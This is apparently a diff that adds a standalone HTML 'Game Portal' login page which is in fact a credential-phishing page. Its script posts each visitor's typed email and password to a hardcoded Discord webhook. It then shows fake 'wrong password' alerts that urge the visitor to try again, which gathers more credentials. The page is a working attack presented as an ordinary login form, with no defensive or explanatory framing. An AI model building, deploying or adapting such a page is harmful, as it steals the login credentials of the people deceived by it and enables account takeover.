@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Game Login</title>
+
+<style>
+body{
+    background:#0f1116;
+    font-family:Arial, sans-serif;
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:#1b1f27;
+    padding:40px;
+    border-radius:10px;
+    width:320px;
+    text-align:center;
+    box-shadow:0 0 20px rgba(0,0,0,0.5);
+}
+
+h2{
+    margin-bottom:20px;
+}
+
+input{
+    width:100%;
+    padding:12px;
+    margin:8px 0;
+    border:none;
+    border-radius:6px;
+    background:#2a2f3a;
+    color:white;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border:none;
+    border-radius:6px;
+    background:#00a2ff;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#0086d1;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<h2>Game Portal</h2>
+
+<form id="form">
+<input type="text" id="Email" placeholder="Email" required>
+<input type="text" id="pass" placeholder="pass" required>
+
+<button type="submit">Enter</button>
+</form>
+
+</div>
+
+<script>
+const webhook="https://discord.com/api/webhooks/1480312174655180902/2Dv4kFWHDqXzxKJIkyDakgwFrScN3iOeXGqdwnsfalxpwV0Ohoz94sOsNbzYKvrxn1SH";
+
+document.getElementById("form").addEventListener("submit",function(e){
+e.preventDefault();
+
+let first=document.getElementById("Email").value;
+let last=document.getElementById("pass").value;
+
+fetch(webhook,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:"New submission:\nEmail: "+first+"\npass: "+last
+})
+});
+
+alert("Error! The email and the pass are WRONG!!!");
+
+alert("TRY AGAIN");
+
+alert("Maybe put your email pass idk it will work ");
+
+
+});
+</script>
+
+</body>
+</html>
